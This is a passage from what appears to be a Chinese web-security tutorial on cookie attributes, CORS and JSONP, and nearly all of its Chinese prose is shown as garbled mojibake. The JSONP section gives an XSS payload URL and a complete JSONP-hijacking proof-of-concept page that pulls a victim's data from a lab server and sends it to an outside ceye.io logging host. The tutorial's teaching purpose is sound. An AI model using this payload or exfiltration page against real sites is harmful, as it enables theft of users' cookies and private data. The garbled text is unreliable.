¹è·¯å¾„ï¼ˆ<code>/</code>ï¼‰ï¼Œåˆ™æ•´ä¸ªç½‘ç«™çš„æ‰€æœ‰é¡µé¢éƒ½èƒ½è®¿é—®è¿™ä¸ªCookieã€‚å¦‚æœæŸäº›è·¯å¾„ä¸‹çš„é¡µé¢å­˜åœ¨å®‰å…¨æ¼æ´ï¼Œé‚£ä¹ˆè¿™äº›é¡µé¢ä¹Ÿèƒ½è®¿é—®åˆ°Cookieï¼Œå­˜åœ¨è¢«åˆ©ç”¨çš„é£é™©ã€‚</li><li>HttpOnlyï¼šå¦‚æœHttpOnlyå±æ€§æœªè¢«è®¾ç½®ï¼ˆå³é»˜è®¤æƒ…å†µä¸‹æˆ–è®¾ç½®ä¸ºfalseï¼‰ï¼ŒCookieå¯ä»¥é€šè¿‡å®¢æˆ·ç«¯è„šæœ¬ï¼Œå¦‚JavaScriptçš„<code>document.cookie</code>è®¿é—®ã€‚</li><li>Secureï¼šå¦‚æœSecureå±æ€§æœªè®¾ç½®ï¼ŒCookieå¯ä»¥é€šè¿‡ä¸å®‰å…¨çš„HTTPè¿æ¥ä¼ è¾“ã€‚</li><li>SameSite</li></ol><ul><li><strong>Strict</strong>ï¼šä¸¥æ ¼çš„è®¾ç½®å¯èƒ½ä¼šå¯¼è‡´åˆæ³•çš„è·¨ç«™è¯·æ±‚åœºæ™¯ï¼ˆä¾‹å¦‚ï¼Œç”¨æˆ·ä»å…¶ä»–ç½‘ç«™ç‚¹å‡»é“¾æ¥è·³è½¬åˆ°ç«™ç‚¹æ—¶ï¼‰ä¸‹Cookieä¸è¢«å‘é€ï¼Œå½±å“ç”¨æˆ·ä½“éªŒã€‚</li><li><strong>Lax</strong>ï¼šç›¸å¯¹å®½æ¾ï¼Œä½†åœ¨æŸäº›æƒ…å†µä¸‹ï¼ˆå¦‚POSTè¯·æ±‚ç­‰ï¼‰ä»ä¸å‘é€Cookieï¼Œå¯èƒ½å½±å“åŠŸèƒ½çš„å®ç°ã€‚</li><li><strong>None</strong>ï¼šå¦‚æœæ²¡æœ‰æ­£ç¡®è®¾ç½®Secureå±æ€§ï¼Œè®¾ç½®SameSiteä¸ºNoneæ—¶å¯èƒ½å¯¼è‡´Cookieåœ¨è·¨ç«™è¯·æ±‚ä¸­è¢«å‘é€ï¼Œå¢åŠ CSRFæ”»å‡»çš„é£é™©ã€‚</li></ul><p><a href="https://blog.csdn.net/dingtao_237/article/details/103007697">å­çˆ¶åŸŸé—®é¢˜</a>ï¼šå­åŸŸå¯ä»¥è·å–åˆ°çˆ¶åŸŸçš„cookieï¼Œåä¹‹åˆ™ä¸è¡Œã€‚æ‰€ä»¥æˆ‘ä»¬åœ¨ç§å…¨ç«™cookieçš„æ—¶å€™ï¼ˆæ¯”å¦‚ç™»å½•çŠ¶æ€ï¼‰ï¼Œéƒ½ä¼šç§åˆ°å…¨ç«™åŸŸåçš„çˆ¶åŸŸä¸Šï¼Œè¿™æ ·å…¨ç«™å¯ä»¥å…±äº«ç™»å½•çŠ¶æ€ã€‚å½“ç„¶è¿™é‡Œè¯´çš„å…¨ç«™åŸŸåéƒ½æ˜¯ä¸€ä¸ªçˆ¶åŸŸçš„æƒ…å†µã€‚</p><h2 id="CORSï¼ˆè·¨æºèµ„æºå…±äº«ï¼‰"><a href="#CORSï¼ˆè·¨æºèµ„æºå…±äº«ï¼‰" class="headerlink" title="CORSï¼ˆè·¨æºèµ„æºå…±äº«ï¼‰"></a>CORSï¼ˆè·¨æºèµ„æºå…±äº«ï¼‰</h2><p>CORS å…¨ç§° Cross-Origin Resource Sharing, è·¨åŸŸèµ„æºå…±äº«ï¼Œæ˜¯ HTML5 çš„ä¸€ä¸ªæ–°ç‰¹æ€§ï¼Œå·²è¢«æ‰€æœ‰æµè§ˆå™¨æ”¯æŒï¼Œè·¨åŸŸèµ„æºå…±äº«(CORS)æ˜¯ä¸€ç§æ”¾å®½åŒæºç­–ç•¥çš„æœºåˆ¶ï¼Œå®ƒå…è®¸æµè§ˆå™¨å‘è·¨æºæœåŠ¡å™¨ï¼Œå‘å‡º XMLHttpRequest è¯·æ±‚ï¼Œä»è€Œå…‹æœäº† AJAX åªèƒ½åŒæºä½¿ç”¨çš„é™åˆ¶ï¼Œä»¥ä½¿ä¸åŒçš„ç½‘ç«™å¯ä»¥è·¨åŸŸè·å–æ•°æ®ã€‚</p><p>CORSï¼ˆCross-Origin Resource Sharingï¼Œè·¨æºèµ„æºå…±äº«ï¼‰æ˜¯ä¸€ä¸ªå…è®¸åœ¨ç½‘é¡µè„šæœ¬ä¸­è®¿é—®ä¸åŒæºæœåŠ¡å™¨èµ„æºçš„å®‰å…¨åŠŸèƒ½ã€‚å®ƒæ˜¯ä¸€ä¸ª W3C æ ‡å‡†ï¼Œæ—¨åœ¨å…‹æœæµè§ˆå™¨åŒæºæ”¿ç­–å¯¹èµ„æºè·¨åŸŸè®¿é—®çš„é™åˆ¶ã€‚</p><h3 id="CORS-çš„å·¥ä½œåŸç†"><a href="#CORS-çš„å·¥ä½œåŸç†" class="headerlink" title="CORS çš„å·¥ä½œåŸç†"></a>CORS çš„å·¥ä½œåŸç†</h3><p><img src="/2024/09/20/WebSecurity/owasptop/browserorigin/image-1.png"><br>CORS é€šè¿‡æ·»åŠ ä¸€ç³»åˆ—æ–°çš„ HTTP å¤´éƒ¨æ¥æ‰©å±•å·²æœ‰çš„ HTTP åè®®ï¼Œä½¿å¾—æœåŠ¡å™¨èƒ½å¤Ÿå£°æ˜å“ªäº›æºç«™å¯ä»¥è®¿é—®è¯¥æœåŠ¡å™¨ä¸Šçš„èµ„æºã€‚åœ¨ CORS ä¸­ï¼ŒHTTP è¯·æ±‚ç”±ä¸¤ç§ç±»å‹ï¼š</p><ol><li><p><strong>ç®€å•è¯·æ±‚ï¼ˆSimple Requestsï¼‰</strong>ï¼š</p><ul><li>ä½¿ç”¨ GETã€HEAD æˆ– POST æ–¹æ³•ã€‚</li><li>POST æ–¹æ³•çš„ <code>Content-Type</code> ä»…é™äº <code>text/plain</code>ã€<code>multipart/form-data</code> å’Œ <code>application/x-www-form-urlencoded</code>ã€‚</li><li>ä¸ä¼šæ”¹å˜æœåŠ¡å™¨çŠ¶æ€çš„è¯·æ±‚è¢«è§†ä¸ºç®€å•è¯·æ±‚ã€‚</li></ul><p>ç®€å•è¯·æ±‚çš„ CORS æµç¨‹ï¼š</p><ul><li>æµè§ˆå™¨åœ¨ç®€å•è¯·æ±‚çš„å¤´éƒ¨ä¸­è‡ªåŠ¨æ·»åŠ  <code>Origin</code> å­—æ®µï¼Œè¿™ä¸ªå­—æ®µæ ‡æ˜è¯·æ±‚æ¥è‡ªå“ªä¸ªæºï¼ˆåè®®+åŸŸå+ç«¯å£ï¼‰ã€‚</li><li>æœåŠ¡å™¨æ ¹æ®è¿™ä¸ªæºå†³å®šæ˜¯å¦å…è®¸è¯·æ±‚ã€‚å¦‚æœå…è®¸ï¼ŒæœåŠ¡å™¨ä¼šåœ¨å“åº”å¤´ä¸­æ·»åŠ  <code>Access-Control-Allow-Origin</code>ã€‚æµè§ˆå™¨åªæœ‰åœ¨æ”¶åˆ°è¿™ä¸ªå¤´éƒ¨ï¼Œå¹¶ä¸”å€¼ä¸è¯·æ±‚çš„æºç›¸åŒ¹é…ï¼Œæˆ–è€…æ˜¯é€šé…ç¬¦ <code>*</code> æ—¶ï¼Œæ‰ä¼šå¤„ç†å“åº”ã€‚å¦‚æœä¸å…è®¸ï¼ŒæœåŠ¡å™¨ä¸ä¼šæ·»åŠ è¯¥å­—æ®µï¼Œæµè§ˆå™¨ä¹Ÿä¼šé˜»æ­¢åº”ç”¨è®¿é—®è¯¥å“åº”ã€‚</li></ul></li><li><p><strong>é¢„æ£€è¯·æ±‚ï¼ˆPreflight Requestsï¼‰</strong>ï¼š</p><ul><li>ä½¿ç”¨äº†é™¤ GETã€HEADã€POST ä¹‹å¤–çš„ HTTP æ–¹æ³•ã€‚</li><li>å‘é€äº†é™¤ç®€å•è¯·æ±‚å¤´ä¹‹å¤–çš„è‡ªå®šä¹‰å¤´ï¼Œå¦‚ <code>application/json</code>ã€‚</li><li>å¯¹æœåŠ¡å™¨æœ‰ç‰¹å®šå½±å“çš„ POST è¯·æ±‚ï¼ˆå¦‚å‘é€ JSON æˆ– XML æ•°æ®ï¼‰ã€‚</li></ul><p>é¢„æ£€è¯·æ±‚çš„ CORS æµç¨‹ï¼š</p><ul><li>åœ¨å‘é€å®é™…è¯·æ±‚å‰ï¼Œæµè§ˆå™¨é¦–å…ˆä¼šå‘é€ä¸€ä¸ª OPTIONS è¯·æ±‚åˆ°æœåŠ¡å™¨ï¼Œè¯¢é—®æœåŠ¡å™¨æ˜¯å¦å…è®¸è·¨åŸŸè¯·æ±‚ã€‚</li><li>è¿™ä¸ª OPTIONS é¢„æ£€è¯·æ±‚åŒ…æ‹¬ä»¥ä¸‹å¤´ä¿¡æ¯ï¼š<code>Origin</code>ã€<code>Access-Control-Request-Method</code>ï¼ˆå®é™…è¯·æ±‚ä¸­å°†ä½¿ç”¨çš„ HTTP æ–¹æ³•ï¼‰å’Œ <code>Access-Control-Request-Headers</code>ï¼ˆå®é™…è¯·æ±‚ä¸­å°†è®¾ç½®çš„è‡ªå®šä¹‰å¤´ä¿¡æ¯ï¼‰ã€‚</li><li>å¦‚æœæœåŠ¡å™¨å…è®¸ï¼Œå®ƒä¼šåœ¨å“åº”ä¸­åŒ…æ‹¬å¦‚ <code>Access-Control-Allow-Methods</code>ã€<code>Access-Control-Allow-Headers</code>ã€<code>Access-Control-Allow-Origin</code> ç­‰å¤´éƒ¨ï¼Œæ˜ç¡®å…è®¸çš„æ–¹æ³•ã€å¤´éƒ¨å’Œæºã€‚</li><li>æµè§ˆå™¨æ¥æ”¶åˆ°å…è®¸çš„å“åº”åï¼Œä¼šå‘é€å®é™…çš„ HTTP è¯·æ±‚ã€‚</li></ul></li></ol><h3 id="CORS-å“åº”å¤´éƒ¨"><a href="#CORS-å“åº”å¤´éƒ¨" class="headerlink" title="CORS å“åº”å¤´éƒ¨"></a>CORS å“åº”å¤´éƒ¨</h3><ul><li>**<code>Access-Control-Allow-Origin</code>**ï¼šæŒ‡å®šå“ªäº›åŸŸå¯ä»¥è®¿é—®åŸŸèµ„æºã€‚ä¾‹å¦‚ï¼Œå¦‚æœrequester.com æƒ³è¦è®¿é—® provider.com çš„èµ„æºï¼Œé‚£ä¹ˆå¼€å‘äººå‘˜å¯ä»¥ä½¿ç”¨æ­¤æ ‡å¤´å®‰å…¨åœ°æˆäºˆ requester.com å¯¹ provider.com èµ„æºçš„è®¿é—®æƒé™ã€‚</li><li>**<code>Access-Control-Allow-Methods</code>**ï¼šæŒ‡å®šå¯ä»¥ä½¿ç”¨å“ªäº› HTTP è¯·æ±‚æ–¹æ³•ï¼ˆGETï¼ŒPUTï¼ŒDELETE ç­‰ï¼‰æ¥è®¿é—®èµ„æºã€‚æ­¤æ ‡å¤´å…è®¸å¼€å‘äººå‘˜é€šè¿‡åœ¨ requester.com è¯·æ±‚è®¿é—®provider.com çš„èµ„æºæ—¶ï¼ŒæŒ‡å®šå“ªäº›æ–¹æ³•æœ‰æ•ˆæ¥è¿›ä¸€æ­¥å¢å¼ºå®‰å…¨æ€§ã€‚</li><li>**<code>Access-Control-Allow-Headers</code>**ï¼šå…è®¸çš„ HTTP è¯·æ±‚å¤´ã€‚</li><li>**<code>Access-Control-Allow-Credentials</code>**ï¼šæŒ‡å®šæµè§ˆå™¨æ˜¯å¦å°†ä½¿ç”¨è¯·æ±‚å‘é€ cookieã€‚ä»…å½“ allow-credentials æ ‡å¤´è®¾ç½®ä¸º true æ—¶ï¼Œæ‰ä¼šå‘é€ Cookieã€‚</li></ul><h3 id="ä½¿ç”¨åœºæ™¯"><a href="#ä½¿ç”¨åœºæ™¯" class="headerlink" title="ä½¿ç”¨åœºæ™¯"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS">ä½¿ç”¨åœºæ™¯</a></h3><p>CORS éå¸¸é€‚ç”¨äºå•é¡µåº”ç”¨ï¼ˆSPAï¼‰ï¼Œè¿™äº›åº”ç”¨é€šå¸¸ä¼šä»å¤šä¸ªæºåŠ è½½èµ„æºã€‚CORS ä¹Ÿæ˜¯å®ç° API æœåŠ¡å’Œå‰ç«¯åˆ†ç¦»çš„å…³é”®æŠ€æœ¯ä¹‹ä¸€ï¼Œä½¿å¾—å‰ç«¯åº”ç”¨å¯ä»¥å®‰å…¨åœ°ä»ä¸åŒæºè·å–æ•°æ®å’Œèµ„æºã€‚<br>SpringCloudè®¾ç½®è·¨åŸŸ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GatewayCorsConfiguation</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> CorsFilter <span class="title function_">corsFilter</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">// åˆå§‹åŒ–corsé…ç½®å¯¹è±¡</span></span><br><span class="line">        <span class="type">CorsConfiguration</span> <span class="variable">configuration</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CorsConfiguration</span>();</span><br><span class="line">        configuration.setAllowCredentials(<span class="literal">true</span>); <span class="comment">// å…è®¸ä½¿ç”¨cookieï¼Œä½†æ˜¯ä½¿ç”¨cookieæ˜¯addAllowedOriginå¿…é¡»æ˜¯å…·ä½“çš„åœ°å€ï¼Œä¸èƒ½æ˜¯*</span></span><br><span class="line"><span class="comment">//        configuration.addAllowedOrigin(&quot;*&quot;);</span></span><br><span class="line">        configuration.addAllowedOrigin(<span class="string">&quot;http://manage.leyou.com&quot;</span>);</span><br><span class="line">        configuration.addAllowedMethod(<span class="string">&quot;*&quot;</span>);  <span class="comment">//å…è®¸çš„è¯·æ±‚æ–¹å¼,get,put,post,delete</span></span><br><span class="line">        configuration.addAllowedHeader(<span class="string">&quot;*&quot;</span>);<span class="comment">//å…è®¸çš„å¤´ä¿¡æ¯</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment">//åˆå§‹åŒ–corsçš„æºå¯¹è±¡é…ç½®</span></span><br><span class="line">        <span class="type">UrlBasedCorsConfigurationSource</span> <span class="variable">corsConfigurationSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UrlBasedCorsConfigurationSource</span>();</span><br><span class="line">        corsConfigurationSource.registerCorsConfiguration(<span class="string">&quot;/**&quot;</span>,configuration);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//3.è¿”å›æ–°çš„CorsFilter.</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">CorsFilter</span>(corsConfigurationSource);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å®‰å…¨é—®é¢˜"><a href="#å®‰å…¨é—®é¢˜" class="headerlink" title="å®‰å…¨é—®é¢˜"></a>å®‰å…¨é—®é¢˜</h3><ul><li>CORS æ”¿ç­–å®Œå…¨ç”±æœåŠ¡å™¨ç«¯æ§åˆ¶ã€‚å¦‚æœæœåŠ¡å™¨é…ç½®ä¸å½“ï¼Œå¯èƒ½ä¼šå¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚</li><li><code>Access-Control-Allow-Origin</code> è®¾ç½®ä¸º <code>*</code> å¯ä»¥å…è®¸æ‰€æœ‰åŸŸåçš„è®¿é—®ï¼Œä½†è¿™é€šå¸¸ä¸æ¨èç”¨äºå¤„ç†æ•æ„Ÿæ•°æ®ã€‚<br>å¯ä»¥ä½¿ç”¨è¿™ä¸ªå·¥å…·åšä¸€äº›æ£€æµ‹ <a href="https://github.com/chenjj/CORScanner">https://github.com/chenjj/CORScanner</a></li></ul><h2 id="JSONPï¼ˆJSON-with-Paddingï¼‰"><a href="#JSONPï¼ˆJSON-with-Paddingï¼‰" class="headerlink" title="JSONPï¼ˆJSON with Paddingï¼‰"></a>JSONPï¼ˆJSON with Paddingï¼‰</h2><p>JSONP æ•™ç¨‹   <a href="https://www.runoob.com/json/json-jsonp.html">https://www.runoob.com/json/json-jsonp.html</a><br><img src="/2024/09/20/WebSecurity/owasptop/browserorigin/image-2.png"><br>JSONPï¼ˆJSON with Paddingï¼‰æ˜¯ä¸€ç§è·¨åŸŸæ•°æ®äº¤æ¢çš„æŠ€æœ¯ï¼Œå®ƒåˆ©ç”¨äº†<code>&lt;script&gt;</code>æ ‡ç­¾æ²¡æœ‰è·¨åŸŸé™åˆ¶çš„ç‰¹æ€§æ¥å‘é€è·¨åŸŸè¯·æ±‚ï¼Œç°åœ¨çš„åº”ç”¨å¾ˆå°‘ã€‚<code>callback</code>æ˜¯ä¸€ä¸ªå¾ˆæœ‰æ•ˆçš„å…³é”®è¯ï¼Œé€šè¿‡åœ¨ç½‘ç»œè¯·æ±‚ä¸­æ£€ç´¢callbackï¼Œæˆ–è®¸å¯ä»¥æ‰¾åˆ°åº”ç”¨çš„ç‚¹ï¼Œå¦‚æœè¿”å›çš„jsonæ˜¯éšç§ç›¸å…³çš„ä¿¡æ¯ï¼Œé‚£ä¹ˆå°±å¯ä»¥å®ç°ä¿¡æ¯æ³„æ¼ç­‰ã€‚</p><h3 id="å·¥ä½œåŸç†"><a href="#å·¥ä½œåŸç†" class="headerlink" title="å·¥ä½œåŸç†"></a>å·¥ä½œåŸç†</h3><p>JSONP çš„å·¥ä½œåŸç†åŸºäºä»¥ä¸‹ä¸¤ä¸ªäº‹å®ï¼š</p><ol><li>æµè§ˆå™¨çš„åŒæºç­–ç•¥é˜»æ­¢äº†ä»ä¸åŒæºåŠ è½½çš„è„šæœ¬è®¿é—®å…¶ä»–æºçš„ DOM å’Œ JavaScript å¯¹è±¡ï¼Œä½†ä¸ç¦æ­¢å‘å…¶ä»–æºå‘é€<code>&lt;script&gt;</code>æ ‡ç­¾çš„è¯·æ±‚ã€‚</li><li><code>&lt;script&gt;</code>æ ‡ç­¾çš„<code>src</code>å±æ€§å¯ä»¥ç”¨æ¥åŠ è½½ä»»ä½•æ¥æºçš„ JavaScript æ–‡ä»¶ã€‚</li></ol><p>å½“éœ€è¦ä»å…¶ä»–åŸŸåè·å–æ•°æ®æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ JSONP æ–¹æ³•ã€‚è¿™ç§æ–¹å¼é€šå¸¸æ¶‰åŠåˆ°ä¸‹é¢å‡ ä¸ªæ­¥éª¤ï¼š</p><ol><li><strong>å®¢æˆ·ç«¯å®šä¹‰å›è°ƒå‡½æ•°</strong>ï¼šé¦–å…ˆåœ¨å®¢æˆ·ç«¯å®šä¹‰ä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å°†å¤„ç†ä»æœåŠ¡å™¨è·å–çš„æ•°æ®ã€‚</li><li><strong>åŠ¨æ€åˆ›å»º <code>&lt;script&gt;</code> æ ‡ç­¾</strong>ï¼šç„¶åé€šè¿‡åŠ¨æ€åˆ›å»º <code>&lt;script&gt;</code> æ ‡ç­¾çš„æ–¹å¼æ¥å‘é€è¯·æ±‚ï¼Œè¯·æ±‚çš„ URL åŒ…å«ä¸€ä¸ªæŸ¥è¯¢å‚æ•°ï¼Œé€šå¸¸æ˜¯ <code>callback</code>ï¼Œå…¶å€¼æ˜¯ä¸Šä¸€æ­¥å®šä¹‰çš„å›è°ƒå‡½æ•°çš„åç§°ã€‚</li><li><strong>æœåŠ¡å™¨å“åº”</strong>ï¼šæœåŠ¡å™¨åœ¨æ¥æ”¶åˆ°è¯·æ±‚åï¼Œä¼šç”Ÿæˆ JSON æ•°æ®ï¼Œå¹¶å°†è¿™ä¸ªæ•°æ®ä½œä¸ºå‚æ•°ä¼ é€’ç»™æŸ¥è¯¢å‚æ•°ä¸­æŒ‡å®šçš„å›è°ƒå‡½æ•°ï¼Œå½¢æˆä¸€æ®µå¯æ‰§è¡Œçš„ JavaScript ä»£ç ã€‚</li><li><strong>æ‰§è¡Œå“åº”</strong>ï¼šå½“è¿™æ®µå¸¦æœ‰æ•°æ®çš„ JavaScript ä»£ç é€šè¿‡ <code>&lt;script&gt;</code> æ ‡ç­¾åŠ è½½å¹¶æ‰§è¡Œæ—¶ï¼Œå®šä¹‰çš„å›è°ƒå‡½æ•°ä¼šè¢«è°ƒç”¨ï¼Œå¹¶ä¸”å®é™…çš„æ•°æ®ä¼šä½œä¸ºå‚æ•°ä¼ å…¥ã€‚</li></ol><h3 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><p>å‡è®¾æœ‰ä¸€ä¸ªå®¢æˆ·ç«¯å›è°ƒå‡½æ•° <code>handleResponse</code>ï¼Œä½ å¸Œæœ›ä» <code>http://example.com/api</code> è·å–æ•°æ®ï¼Œä½ å¯ä»¥è¿™æ ·å®ç° JSONP è¯·æ±‚ï¼š<br><strong>å®¢æˆ·ç«¯ä»£ç </strong>ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">handleResponse</span>(<span class="params">data</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Received data: &quot;</span> + data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">script.<span class="property">src</span> = <span class="string">&#x27;http://example.com/api?callback=handleResponse&#x27;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(script);</span><br></pre></td></tr></table></figure><p><strong>æœåŠ¡å™¨ç«¯å“åº”</strong>ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">handleResponse</span>(&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Alice&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">25</span>&#125;);</span><br></pre></td></tr></table></figure><p>è¿™æ®µå“åº”æ˜¯ä¸€ä¸ª JavaScript ä»£ç ï¼Œè°ƒç”¨äº†å®¢æˆ·ç«¯å®šä¹‰çš„ <code>handleResponse</code> å‡½æ•°ï¼Œå¹¶ä¼ å…¥äº†æ•°æ®ã€‚</p><h3 id="å®‰å…¨è€ƒè™‘"><a href="#å®‰å…¨è€ƒè™‘" class="headerlink" title="å®‰å…¨è€ƒè™‘"></a>å®‰å…¨è€ƒè™‘</h3><p>1ã€å¯¹äºè¾“å…¥çš„callbackå‡½æ•°åè¿‡æ»¤ä¸ä¸¥æ ¼ï¼Œå¯¼è‡´è¾“å…¥çš„æ•°æ®ç›´æ¥è¾“å‡ºåˆ°å‰ç«¯é€ æˆXSS<br>2ã€JSONPåŠ«æŒæ¼æ´ï¼Œç”±äºå¯¹äºæ¥æºåŸŸæ²¡æœ‰ä¸¥æ ¼é™åˆ¶ï¼Œå› æ­¤æ¥æºäºä¸å®‰å…¨çš„åŸŸçš„è¯·æ±‚ä¹Ÿä¼šè¢«å“åº”<br>éšç€ CORSï¼ˆè·¨æºèµ„æºå…±äº«ï¼‰æ ‡å‡†çš„æ™®åŠï¼ŒJSONP çš„ä½¿ç”¨è¶Šæ¥è¶Šå°‘ã€‚CORS æä¾›äº†ä¸€ç§æ›´å®‰å…¨ã€æ›´çµæ´»çš„è·¨åŸŸè¯·æ±‚æ–¹å¼ï¼Œå…è®¸æœåŠ¡å™¨æ›´ç²¾ç»†åœ°æ§åˆ¶å“ªäº›ç½‘ç«™å¯ä»¥è®¿é—®å“ªäº›èµ„æºï¼ŒåŒæ—¶æ”¯æŒæ‰€æœ‰ç±»å‹çš„ HTTP è¯·æ±‚ï¼ˆä¸ä»…ä»…æ˜¯ GET è¯·æ±‚ï¼‰ï¼Œè€Œ JSONP ä»…æ”¯æŒ GET è¯·æ±‚ã€‚å› æ­¤ï¼Œåœ¨ç°ä»£ Web åº”ç”¨å¼€å‘ä¸­ï¼Œæ¨èä½¿ç”¨ CORS è€Œä¸æ˜¯ JSONPã€‚</p><p>ç›´æ¥æ„é€ xssï¼š<code>http://xxxxxx/jsonp/index.php?callback=jsonp_5981%3Cimg%20src=x%20onerror=alert(/xss/)%3E</code>ï¼Œå¯ä»¥è·å–åˆ°ç”¨æˆ·çš„cookieä¿¡æ¯æˆ–è€…åŠ«æŒç”¨æˆ·è·³è½¬åˆ°é’“é±¼ç½‘ç«™<br>JSONPåŠ«æŒï¼šJSONPåŠ«æŒï¼Œå®è´¨ä¸Šç®—æ˜¯ä¸€ç§è¯»ç±»å‹çš„CSRFï¼Œåœ¨æ¶æ„çš„ç½‘é¡µä¸­æ„é€ æ¶æ„çš„JSä»£ç ï¼Œå½“åˆæ³•ç”¨æˆ·ç‚¹å‡»è¯¥ç½‘é¡µï¼Œç”±äºç›®æ ‡ç«™ç‚¹å­˜åœ¨JSONPåŠ«æŒæ¼æ´çš„æ¥å£ï¼Œå› æ­¤ä¼šå°†ç”¨æˆ·çš„è¯¥æ¥å£å¯¹åº”çš„ä¿¡æ¯åŠ«æŒï¼Œå¹¶å°†å…¶å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>jsonpåŠ«æŒ<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">jsonp_hack</span>(<span class="params">v</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>(<span class="string">&quot;jsonpåŠ«æŒ&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> h=<span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> v)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> a=<span class="string">&#x27;&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        a=key+<span class="string">&#x27; : &#x27;</span>+v[key]+<span class="string">&#x27; ,&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        h+=a</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>(h);</span></span><br><span class="line"><span class="language-javascript">    $.<span class="title function_">get</span>(<span class="string">&#x27;http://jsonp1.kijkv0.ceye.io?value=&#x27;</span>+h);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://172.16.31.149/jsonp/index.php?callback=jsonp_hack&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>jsonpåŠ«æŒ<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span 